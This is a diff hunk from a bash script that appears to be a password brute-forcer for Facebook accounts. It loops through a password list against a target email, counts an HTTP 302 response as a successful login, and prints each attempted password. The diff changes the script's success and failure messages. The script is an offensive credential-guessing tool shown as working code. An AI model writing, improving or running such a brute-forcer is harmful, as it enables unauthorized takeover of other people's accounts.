@@ -75,14 +75,13 @@ while [[ true ]]; do
 	fi
 	if [ "$error" != true ]; then
 	realnumbword=$(let realnumbword=$numbword+1&& echo $realnumbword)
-	echo -en "\t$realnumbword/${#passlist[@]}\ttry: $currentword\r"
 		if [[ $response == "302" ]]; then
-			echo -e "\t\t\t\t\t\tfound!"
+			echo -e "[$realnumbword/${#passlist[@]}] - uname - \"$email\" - passwd \"$currentword\" - successed"
 			echo "Password found: ${green}${bold}$currentword${reset}"
 			rm -rf /tmp/fbrooter
 			break
 		else
-			echo -e "\t\t\t\t\t\twrong!"
+			echo -e "[$realnumbword/${#passlist[@]}] - uname - \"$email\" - passwd \"$currentword\" - failed"
 		fi
 	fi
 	let lastwordnumber=$lastwordnumber-1
